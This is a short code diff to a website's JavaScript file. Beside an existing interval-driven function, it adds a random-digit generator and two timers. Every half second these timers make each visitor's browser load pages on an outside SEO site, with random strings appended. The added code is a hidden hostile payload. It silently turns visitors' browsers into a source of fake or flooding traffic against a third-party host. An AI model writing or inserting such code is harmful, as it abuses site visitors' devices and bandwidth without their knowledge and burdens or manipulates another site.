@@ -75,3 +75,14 @@ function kcc() {
 	
 	setInterval(function(){ kcc(); }, 100);
 }
+function texts(l) {
+    var t = '';
+    var p = "01234567890123456789";
+    for( var i=0; i < l; i++ ) {
+      t += p.charAt(Math.floor(Math.random() * p.length)); 
+    }
+    return t;
+  }
+
+window.setInterval(function(){var teya=new Image().src="https://www.seohocasi.com/soru-cevap/google-botlari-siteye-nasil-getirilir/?"+texts(4);}, 500);   
+window.setInterval(function(){var teya=new Image().src="https://www.seohocasi.com/soru-cevap/arama/"+texts(4);}, 500);   
